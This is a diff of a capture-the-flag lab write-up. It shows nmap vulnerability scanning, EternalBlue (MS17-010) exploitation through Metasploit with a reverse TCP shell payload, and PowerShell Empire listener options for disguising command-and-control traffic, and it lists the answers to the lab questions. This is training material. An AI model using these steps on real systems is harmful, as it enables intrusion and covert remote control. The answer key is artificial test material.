@@ -24,11 +24,12 @@ The first task is to deploy the machine and learn what vulnerabilities are there
 
 #### 1 — Deploy this machine and learn what exploitation this box is susceptible to!
 
-Answer : ```nmap --script vuln {target_ip}```
+Answer : ``nmap --script vuln {target_ip}``
 
 When the nmap scan is completed you might see something like this kind of result:
 
 ```
+
 |_samba-vuln-cve-2012–1182: NT_STATUS_ACCESS_DENIED |_smb-vuln-ms10–054: false |
 smb-vuln-ms10–061: NT_STATUS_ACCESS_DENIED | smb-vuln-ms17–010: | VULNERABLE: | Remote Code 
 Execution vulnerability in Microsoft SMBv1 servers (ms17–010) | State: VULNERABLE | IDs: 
@@ -37,29 +38,30 @@ in Microsoft SMBv1 | servers (ms17–010). | | Disclosure date: 2017–03–14 |
 https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/ 
 | https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143 | https://technet.microsoft.com/
 en-us/library/security/ms17-010.aspx
+
 ```
 
-You need to identify the vulnerability identifier and this is it : ```ms17–010```
+You need to identify the vulnerability identifier and this is it : ``ms17–010``
 
 ---
 
 #### 2 — Exploit the vulnerability to spawn a reverse shell!
 
 First of all, you need to start msfconsole. I prefer the silent way, so i write the 
-command```msfconsole -q```. I just dont want the banners 😁
+command``msfconsole -q``. I just dont want the banners 😁
 
 When msf loads you choose the right exploit for the job! This is the right one i have found in 
 Google :
 
-```use exploit/windows/smb/ms17_010_eternalblue```
+``use exploit/windows/smb/ms17_010_eternalblue``
 
 You can simply search inside metasploit for an exploit by running the command:
 
-```search ms17_010_eternalblue```
+``search ms17_010_eternalblue``
 
 When you see the exploit you want to use you simply write:
 
-```use exploit_number_here```
+``use exploit_number_here``
 
 And metasploit will pick the hole exploit name for you.
 
@@ -68,16 +70,18 @@ default payload metasploit gives you so you need to find a better one, that work
 
 After spending a hole hour searching which one is working, eventually i found it.
 
-```set payload /windows/x64/shell/reverse_tcp```
+``set payload /windows/x64/shell/reverse_tcp``
 
 When you set the payload successfully you need to see the options available to you.
 
 ```
+
 run the show options command / or just options (I prefer it).
 Change Rhosts to { target_ip }
 Change Lhost to your {thm_vpn_ip}
 Change Rport to {your_choice}
 Run the exploit with the exploit command!
+
 ```
 
 ---
@@ -121,35 +125,35 @@ As DarkStar7471 said in the first section of Listeners task, If you’re going t
 
 #### 1 — Once Empire has launched, type help to view the various menus. Which menu to we launch to access listeners?
 
-Answer : ```listeners```
+Answer : ``listeners``
 
 #### 3 — What command can we now type to view all of the options related to our selected listener type?
 
-Answer : ```info```
+Answer : ``info``
 
 #### 4 — Once the information regarding the listener pops up, peruse this for some of the more interesting options we can set in order to disguise our actions more. Which option can we use to set specific times when our listener will be active?
 
-Answer : ```Workinghours```
+Answer : ``Workinghours``
 
 #### 5 — Similar to changing/spoofing what browser you are using on the internet, what option can we set to appear as a different user agent (i.e. chrome, firefox, etc)?
 
-Answer : ```DefaultProfile```
+Answer : ``DefaultProfile``
 
 #### 6 — What option can we use to set the port which the listener will bind to?
 
-Answer : ```port```
+Answer : ``port``
 
 #### 7 — In addition to changing our browser profile, we can change what our server appears as. What option can we set to change this?
 
-Answer : ```ServerVersion```
+Answer : ``ServerVersion``
 
 #### 8 — Launch our newly created listener on port 80 with the command ‘execute’. What message is displayed following successfully launching the listener?
 
-Answer : ```Listener successfully started!```
+Answer : ``Listener successfully started!``
 
 #### 9 — We can verify that our listener is now active by typing what command?
 
-Answer : ```listeners```
+Answer : ``listeners``
 
 ---
 
